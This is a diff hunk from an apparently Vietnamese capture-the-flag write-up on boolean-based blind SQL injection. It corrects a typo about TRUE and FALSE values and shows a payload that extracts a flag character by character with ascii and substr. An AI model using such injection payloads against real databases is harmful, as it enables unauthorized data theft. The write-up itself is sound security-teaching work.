@@ -18,7 +18,7 @@ Nhưng mà bị filter gần hết. Sau đó thì mình có thử boolean
 1=0 --->  Do you want to be my girlfriend? /// select * from abc where id = 1 = 0 /// select * from xxx where id = 1 = FALSE;
 ```
 
-Bởi vì là trong SQL 1 là TRUE và 2 là FLASE. Như vậy khi mình nhập 1=1 có nghĩa là `1=TRUE` thì trả về `id=1`, còn với 1=0 nghĩa là `id=1=Fasle` nên trả về `id=2`.Bởi vì 2 chỉ là 1 số bình thường nên khi nhập `1=2` sẽ trả về lỗi
+Bởi vì là trong SQL 1 là TRUE và 0 là FLASE. Như vậy khi mình nhập 1=1 có nghĩa là `1=TRUE` thì trả về `id=1`, còn với 1=0 nghĩa là `id=1=Fasle` nên trả về `id=2`.Bởi vì 2 chỉ là 1 số bình thường nên khi nhập `1=2` sẽ trả về lỗi
 
 Payload:
 `1=(ascii(substr((select(flag)from(flag)),1,1))=100)`
